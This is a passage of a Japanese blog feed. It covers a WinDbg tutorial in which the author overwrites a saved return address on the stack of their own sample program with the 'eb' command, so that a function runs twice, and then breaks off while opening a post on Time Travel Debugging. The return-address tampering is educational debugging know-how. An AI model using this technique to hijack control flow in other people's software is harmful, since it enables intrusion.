            sizes=&quot;(max-width: 554px) 100vw, 554px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1cabcf6604be115fac70bf2636e0bf95/04abd/image-41.png&quot;
            alt=&quot;image-41.png&quot;
            title=&quot;image-41.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このアドレスについて、Disassemblyウインドウで確認したところ、&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数の実行が完了して戻り値を返した後に実行される命令のアドレスであることがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/40941ec5ef1fd3456d2071540c9f93f0/75609/image-42.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAACRElEQVQoz3WSC2/TMBSF8++RgDHBj+BXoGkPNCQYg3bL2qRJ0yTOY3nYead5NIfrbFDEhKVP17Gdo3OPrXz8yvDhiuHVJxtvzz2cXPh4febSnOHNmY2TcwfvLhycXjK8/+zP9fTSw+mFhL2oimntoBkW1qYN3XLgxwLtCCT5iCguENopgl2K0OEooj26fEJXEwdifImiaxo2ug5ru4WhaxCcQ45M9GjKBrEXoc1q1LxCKxqgo0368X9D0UhQom82s2ieF/NGmvaosxZ1WAMlLcjlHJj4hKkgOmJPkNNpOjILzi43BjzPQ9vuMQw9EhJs8hbZLsPe36MPe0wpORMkHD0TS7f/ONSpXcmW3FnWFqqqIssycnpALmSGAWI/RsxiJF4C7nPwhMgIkSKO45kkSVBW5VOGuqbDMMy5ddt20HV7iGxAXTQISDB0Q8RuDB6QiMchEgEhBMVyFJQmuq6DYlB2hmHMQjJDlzGM44iScqvrBsxj8AMfj9EjsjwjVyTKU6RcVj47i6Loj6iyXCxwc3ODxXKJH7e3uL7+gjAM4NAz8cmduTBh3Vswf5rQv+vQvq2hqRrWz9k/qA9YrVZYr9dkyoai3t9jSWJ3VOUB2bogF0FY0pNJEKx8BGoAducRDM7SAVtQXbhw71w4W4e6ornLqKvfGc6XYtGlSHZ0/Qdq74CuGFDZJVrWonEa1Lsa1bZC5RFJhTqh77KahaqqOmZomubsTObAuUDfd1QHFEUJXnB6GSOGw3Bk/IthoPM9+uFp/gstOXoteJ6MiAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/40941ec5ef1fd3456d2071540c9f93f0/8ac56/image-42.webp 240w,
/static/40941ec5ef1fd3456d2071540c9f93f0/d3be9/image-42.webp 480w,
/static/40941ec5ef1fd3456d2071540c9f93f0/e46b2/image-42.webp 960w,
/static/40941ec5ef1fd3456d2071540c9f93f0/fd213/image-42.webp 994w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/40941ec5ef1fd3456d2071540c9f93f0/8ff5a/image-42.png 240w,
/static/40941ec5ef1fd3456d2071540c9f93f0/e85cb/image-42.png 480w,
/static/40941ec5ef1fd3456d2071540c9f93f0/d9199/image-42.png 960w,
/static/40941ec5ef1fd3456d2071540c9f93f0/75609/image-42.png 994w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/40941ec5ef1fd3456d2071540c9f93f0/d9199/image-42.png&quot;
            alt=&quot;image-42.png&quot;
            title=&quot;image-42.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次に、&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の実行が完了した後に呼び出されるアドレスを確認するため、関数が呼び出された瞬間の&lt;code class=&quot;language-text&quot;&gt;rsp&lt;/code&gt;レジスタの値を確認してみます。&lt;/p&gt;
&lt;p&gt;レジスタの情報から&lt;code class=&quot;language-text&quot;&gt;0xa74d0ffd58&lt;/code&gt;がスタックポインタのアドレスであることがわかりましたので、Memoryウインドウを確認してみます。&lt;/p&gt;
&lt;p&gt;どうやら、&lt;code class=&quot;language-text&quot;&gt;0x7FF6964514B7&lt;/code&gt;という値が格納されているようです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 450px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/edbc69403a43689b53084056d7218281/fc2a6/image-43.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 108.74999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD3ElEQVQ4y3VVa3eiWBDk//+j7J7MZI3GGAXkJU9BBBSfM2bPJJqTpKa6Mbv7ZT/0udzm0l3VXX0xoihFmhZYt3vsdkdstwfaUW2z2WO72dH2/7Gd+luel/XfM50Zm80Wx+NPnJ7/xo8fJ5xOz7qK/fr1itfX8//ay8sZl/Mb3t5ol84YcEM0WxwOByzLJZqmQVVVWFY1P3jpDl/tcvmyCy7cn89nvL+/4+PjA5+fn2qG53qYjCcoigU810WSZJqgXBT0lRq8rmtdkyRBkqZMXCLLMt3P5zkWi5JrhjzPYURhCJeB6rpBEsca+LDfX5HWkJJsyWK322G5XKKktes11rS6rrDiulqt+K7U88bjcIjb22/MlmL0OMTU8dAQUcrsMX3iLxcLNi7RxJ7vIwjEAkynU/hcffp8z8NsFsKIowgeN0IriSNCL9iko6JomHm1WrOjrSIqSXVJ6pJQkghFoat+IleE5sREvz9AzlrYlskskX6csyYZfUVRKP0F1xnLE8UJfTkRp4gJIJvP9TkisDTNYMxmM0J3NEPI5zTLsWNTqmrJ+rSKvOValouuAUSzYoKmqVET7Zrv2k2rKEuqxLAtCw8PQ22Gy5qEUYwNKRb5HMWVjiJk18Mw0i4L3YVQJjopgVCP2dAsm8OwrgHnV8qeF7CzrVLOKRtJJAGjKGQjZkgoF6EvpZCAIif5VnqhAZWy7eiLmB9JV0Uispcii3UUGw1SEJkKnyUq8kJLIM8LJpbVGD+N0Ov1CHsOczKiNDzqbk3ZsMhZyqykWBZI2YAZ5ZIkMZpKAsyJMNXatu0KGWUlOjbsaYDB0ILjJRibnBozgOtnsJ0IUy+jpXADJrNDjK0ZzKn4Ez3jXN85fqrvw5iT8sBgN3/20RvYuP0+xLe7JwyffPzFff/RwwOfh08B7u5NfKfd9S09ez900B+6POPTXNz1JgShwg7ZCJftJ+wk0gI/n35SKg2bs2Y9NzgetljVSx0vkUu7rrFe1UpVGrjbbnQvgv9H2F2XrW702AARuvhErAVlIdIIKewZpSMilmeZsIDjJiMnd4I01JB5HI2e+EEBZ2rDYcBWddiNlfiXZafHr9tGGvU1HbKX54wmAIyAg22ZFulUOilyIcjtooeoM0Emo5ZpINFmp0Ex8UnCbp9T8CWMyWSC/v1AD5uTMWzb1etIEslkCDWZAtGr3DBh1FEWk1tG9l8+pSw0fD/QIEJFMh4Oe80mqLsLtrrOanfb1FXnl/H7OtOda2AM+n3c3PyhaB4GfYwnlv4KLNPUS8NxHFWBbVuwtGkuxe/Apd+UM053RvYC7DdDEyxIDRyupgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/edbc69403a43689b53084056d7218281/8ac56/image-43.webp 240w,
/static/edbc69403a43689b53084056d7218281/8626f/image-43.webp 450w&quot;
              sizes=&quot;(max-width: 450px) 100vw, 450px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/edbc69403a43689b53084056d7218281/8ff5a/image-43.png 240w,
/static/edbc69403a43689b53084056d7218281/fc2a6/image-43.png 450w&quot;
            sizes=&quot;(max-width: 450px) 100vw, 450px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/edbc69403a43689b53084056d7218281/fc2a6/image-43.png&quot;
            alt=&quot;image-43.png&quot;
            title=&quot;image-43.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;先ほど同様Disassemblyウインドウを確認すると、&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の実行が完了した後に呼び出される予定の命令のアドレスであることが確認できました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 840px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/859de4dce43eae51c0392542e57f1b70/1e088/image-44.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABaUlEQVQoz42PXXOaUBRF+f+/p51MpzNJbBILlqo1RiNcvm5BiFIxQEFFWL2R9LXTfWbNPnPOy95atBKMP31G/3iF/uGK5fUA+8sQe3CPb0yQ5hRHNxAPQ8TdEF8fIb+ZBCMT+YbeE7y7tpjNmZnfmY8nLKY/mHzVCSxBU+SsvZQ0TImWDnIp+BXEVOGe6mdGHSmP99R7RdZTKTTPdZHSJwg8wijE8Tws4dCpKSs4HKFIC/ZJzm6dUaYVTd5y2B055Wf1P3FsGuVHmrZFM8aPXBszbhQPozGD21tMlThNN9h2gu8mbB4TQiNUlQJV2UfeS5wbB//Ox525eCqE46gWUqLNlxaTJ4vpwubp2cK2LF5eNhwOFXGcs92+Ertrtv6WclNSxAVFpEiKfs8VpaLo0azVCmFbCGuFDAKqquavdrsz1e+G1yLjRMP/SLNtW1UTCCFUovhy7Lru4ll2oq4b2vO5v7fd5fcv/gDlFAXQng7N7gAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/859de4dce43eae51c0392542e57f1b70/8ac56/image-44.webp 240w,
/static/859de4dce43eae51c0392542e57f1b70/d3be9/image-44.webp 480w,
/static/859de4dce43eae51c0392542e57f1b70/ed60d/image-44.webp 840w&quot;
              sizes=&quot;(max-width: 840px) 100vw, 840px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/859de4dce43eae51c0392542e57f1b70/8ff5a/image-44.png 240w,
/static/859de4dce43eae51c0392542e57f1b70/e85cb/image-44.png 480w,
/static/859de4dce43eae51c0392542e57f1b70/1e088/image-44.png 840w&quot;
            sizes=&quot;(max-width: 840px) 100vw, 840px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/859de4dce43eae51c0392542e57f1b70/1e088/image-44.png&quot;
            alt=&quot;image-44.png&quot;
            title=&quot;image-44.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;メモリの情報を改ざんする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E6%94%B9%E3%81%96%E3%82%93%E3%81%99%E3%82%8B&quot; aria-label=&quot;メモリの情報を改ざんする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリの情報を改ざんする&lt;/h2&gt;
&lt;p&gt;最後に、&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数終了後にジャンプする&lt;code class=&quot;language-text&quot;&gt;rsp&lt;/code&gt;レジスタのアドレスが指すメモリの情報を改ざんして、任意の関数を実行させたいと思います。&lt;/p&gt;
&lt;p&gt;WinDbgでは、Memoryウインドウの値を直接書き換えることで、メモリの情報を任意の値に改ざんすることが可能です。（管理者権限でWinDbgを起動しておく必要があります）&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/memory-window&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg でのメモリの表示と編集 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;なお、僕の環境で利用しているWinDbg Previewでは、Memoryウインドウから値の改ざんができませんでした。（Windows Debug Toolsに含まれる WinDbg X64 では可能だったので、Preview版が未対応であるか、バグである可能性があります。）&lt;/p&gt;
&lt;p&gt;そのため、今回はMemoryウインドウからではなく、&lt;code class=&quot;language-text&quot;&gt;e&lt;/code&gt;コマンドを利用してメモリの情報を改ざんしていきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/e--ea--eb--ed--ed--ef--ep--eq--eu--ew--eza--ezu--enter-values-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;e、ea、eb、ed、eD、ef、ep、eq、eu、ew、eza (値の入力) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;改ざんしたいアドレスは、&lt;code class=&quot;language-text&quot;&gt;rsp&lt;/code&gt;レジスタの指し示している&lt;code class=&quot;language-text&quot;&gt;0x000000150acffb58&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;このアドレスの値を、&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の呼び出しアドレスに変更して、もう一度&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数が実行されるように改ざんしていきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の呼び出しアドレスは&lt;code class=&quot;language-text&quot;&gt;0x00007ff7 81df1470&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;以下のコマンドでまとめてメモリの情報を改ざんできます。（リトルエンディアン記法なので、逆から入力してます）&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;eb 000000150acffb58 0x70 0x14 0xdf 0x81 0xf7 0x7f 0x00 0x00&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;コマンドを実行すると、見事にメモリの情報を書き換えることができました！&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 470px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1457b24c4c4f8accce704bebb69e8587/f96db/image-45.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 97.50000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACzElEQVQ4y4VU2XLbMAzU//9aJo2P2JmJ60OOrYMiKcmy5COWUexKcj3tTPuwAx4guMASDBaLlez2iThXirMF4V0hNvOSGfc3sh46NsYrhrnVM06CLLNSlpV4n2tQTxiTSV038v39Ldfr9Qk6v1zlojifL7rfyu0G3KRtW/oHy+VSkiSR7TaU9XolYRjKZrORNE31olLyvJCiKDkuikIOh4NeVnN8Op00+IXA2v0uEnzM5wyY57kySzVlz02MjQYF2yzLeAH8kBGCWWs1K89zmBtj5KYsydBaxw3v1Wrqx+ORTAZbVRXXEQCHMS/LQ8f2WKtfxfW2vUvw/j7lzc5ZZdQxqOujBvB6COnmtNaCqSGzPPdSaTDvHP1ABOdbzTl4GS3lY7GX0ftGpvOtTGahvLz9lLfpmhgpXsdL+TFZyWQeylj34fs6XtE+ozzUGvB1KtuvvXztYgm3O0UkSWplH6USKbAO7BTbr4jAPI6N2kSfXExg7aKvIAjDDVNAPYrcU83L+cy0GxWnqrpa1gqkjvpxr6m7dR2jhvC7I+XZbKY1TFkbKOVUIDg61wkFhTEGoDT8IMCgMKzDWfWjKIvFgkIMh62Om6ZhABzGC4DFRZ4CDCJ08G4Y+06Uz89PBoIjlMTBqk8B6QO4oGNtH0EZ5ElhzBlwPp8xFSzgMWdkWEupz6XouwMBUTuUBPtWCZjMkAiAdYApb9Zr0sVBiIMH3LVW/mg3BMO7w5htSPsELVeOhw2G4/FIn0fEm6JoT4HgFMexjuPeJg8gmzT9c9z5kCGeDVuqLCgMWLFT0KO4ue/V3/gPw+l0IrFGhyDdTd0vg9sNGfQfRF8nk3UtONSN6/AbaogvC4LgJqgFRlCU76xXNO+ZDij+mFN5tQ+GURTztpSfQ8bgrNFT3Qa2KZn142EdfmrJEEXH74yn0bXU6fFhovVom+bfgJ9atN4vRkDkIouePKcAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1457b24c4c4f8accce704bebb69e8587/8ac56/image-45.webp 240w,
/static/1457b24c4c4f8accce704bebb69e8587/4424c/image-45.webp 470w&quot;
              sizes=&quot;(max-width: 470px) 100vw, 470px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1457b24c4c4f8accce704bebb69e8587/8ff5a/image-45.png 240w,
/static/1457b24c4c4f8accce704bebb69e8587/f96db/image-45.png 470w&quot;
            sizes=&quot;(max-width: 470px) 100vw, 470px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1457b24c4c4f8accce704bebb69e8587/f96db/image-45.png&quot;
            alt=&quot;image-45.png&quot;
            title=&quot;image-45.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドでプログラムの実行を再開したところ、&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数の処理が終了した後にもう一度&lt;code class=&quot;language-text&quot;&gt;ret_func&lt;/code&gt;関数が呼び出され、本来一度しか表示されないはずの&lt;code class=&quot;language-text&quot;&gt;Call ret_func&lt;/code&gt;というテキストが2回出力されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2e8be04956866299fe714ccb045afd39/0b533/image-46.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAAAtUlEQVQoz7WTWwqDMBBFJxHsjxAfGIkg/qjVbqIP0JKswLr/fdzGtKUUCgW1H4dJCDlMuBM6nS/ougPatkXT7FHXNcqyhFIKeZ7b+puiKJAkCcbxBlL20s73QUSr6fsrKI5jt2GMW9giPM9zjmE4goQQqzvjnLtqdA8Kw3AzodZma6H+gzCKomcobLHwFYox9slBEGwyMo+UB1BVVW4opZRI0/Qr81mWZR9I+V7Pn2BubJom3AHwb93Jg1cUsQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2e8be04956866299fe714ccb045afd39/8ac56/image-46.webp 240w,
/static/2e8be04956866299fe714ccb045afd39/d3be9/image-46.webp 480w,
/static/2e8be04956866299fe714ccb045afd39/b0a15/image-46.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2e8be04956866299fe714ccb045afd39/8ff5a/image-46.png 240w,
/static/2e8be04956866299fe714ccb045afd39/e85cb/image-46.png 480w,
/static/2e8be04956866299fe714ccb045afd39/0b533/image-46.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2e8be04956866299fe714ccb045afd39/0b533/image-46.png&quot;
            alt=&quot;image-46.png&quot;
            title=&quot;image-46.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は、WinDbgでメモリの情報を参照したり改ざんしたりする方法について紹介しました。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[【WinDbg Preview】Time Travel Debuggingで始める新しいデバッグ手法]]></title><link>https://kashiwaba-yuki.com/windows-windbg-008-time-travel-debugging</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-008-time-travel-debugging</guid><pubDate>Mon, 18 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;今回は、UWP版のWinDbg Previewから利用可能になった Time Travel Debugging 機能の公式チュートリアルを試していきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/time-travel-debugging-walkthrough&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Time Travel Debugging - サンプル アプリのチュートリアル - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この記事では以下の内容についてまとめています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#time-travel-debugging-%E3%81%A8%E3%81%AF&quot;&gt;Time Travel Debugging とは&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ttd%E3%81%A7%E4%BD%9C%E6%88%90%E3%81%95%E3%82%8C%E3%82%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB&quot;&gt;TTDで作成されるファイル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ttd%E3%81%A7%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E3%81%93%E3%81%A8&quot;&gt;TTDでできないこと&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%81%E3%83%A5%E3%83%BC%E3%83%88%E3%83%AA%E3%82%A2%E3%83%AB%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E6%BA%96%E5%82%99&quot;&gt;チュートリアル：サンプルプログラムの準備&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ttd_sampleexe-%E3%82%92ttd%E3%81%A7%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%99%E3%82%8B&quot;&gt;ttd_sample.exe をTTDでトレースする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
